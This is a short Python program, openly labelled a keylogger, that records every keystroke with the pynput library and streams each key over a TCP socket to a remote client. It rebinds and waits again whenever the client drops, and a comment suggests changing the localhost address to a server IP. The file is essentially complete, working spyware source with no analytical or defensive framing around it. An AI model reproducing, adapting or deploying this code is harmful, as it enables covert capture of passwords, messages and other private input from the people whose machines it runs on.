import socket
from pynput.keyboard import Key, Listener
import time

# Server socket setup
SERVER_HOST = '127.0.0.1'  # Localhost (change to server IP if needed)
SERVER_PORT = 65432  # Port to bind to
BUFFER_SIZE = 1024  # Size of buffer for receiving data

def on_press(key, connection):
    """Handles key press events and sends key data to the client."""
    key_data = ""
    try:
        key_data = key.char  # Get the character representation of the key
    except AttributeError:
        key_data = handle_special_keys(key)  # Handle special keys

    # Send key data to client
    try:
        connection.sendall(key_data.encode())  # Encode and send the key data
    except Exception as e:
        print(f"[-] keylogger Client disconnected. Reconnecting... ({e})")
        return False  # Signal that the client has disconnected
    return True  # Signal that the connection is still active

def handle_special_keys(key):
    """Handles special key mappings to readable text."""
    special_keys = {
        Key.space: " ",
        Key.enter: "\n",
        Key.tab: "\t",
        Key.backspace: "[BACKSPACE]",
        Key.shift: "[SHIFT]",
        Key.ctrl: "[CTRL]",
        Key.alt: "[ALT]",
        Key.cmd: "[CMD]",
    }
    return special_keys.get(key, f"[{key}]")  # Default to key name if not mapped

def on_release(key):
    """Stops the listener if the Escape key is pressed."""
    if key == Key.esc:
        return True  # Returning True exits the listener

def start_listener(connection):
    """Starts the key listener and sends data to client."""
    with Listener(on_press=lambda key: on_press(key, connection), on_release=on_release) as listener:
        listener.join()  # Keep listening for key events

def start_server():
    """Sets up the server socket to listen for client connections."""
    while True:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Reuse address after disconnect
        server_socket.bind((SERVER_HOST, SERVER_PORT))  # Bind to specified host and port
        server_socket.listen(1)  # Allow one client connection at a time

        print(f"[*] keylogger listening on {SERVER_HOST}:{SERVER_PORT}...")

        connection, address = None, None
        try:
            connection, address = server_socket.accept()  # Accept client connection
            print(f"[+] keylogger Connected to {address}")
            start_listener(connection)  # Start capturing key presses
        except Exception as e:
            print(f"[!] keylogger Error: {e}")
        finally:
            if connection:
                connection.close()  # Ensure the connection is closed properly
            print("[-] keylogger Client disconnected. Waiting for reconnection...")
            time.sleep(2)  # Wait before attempting to reconnect

if __name__ == "__main__":
    start_server()  # Run the server
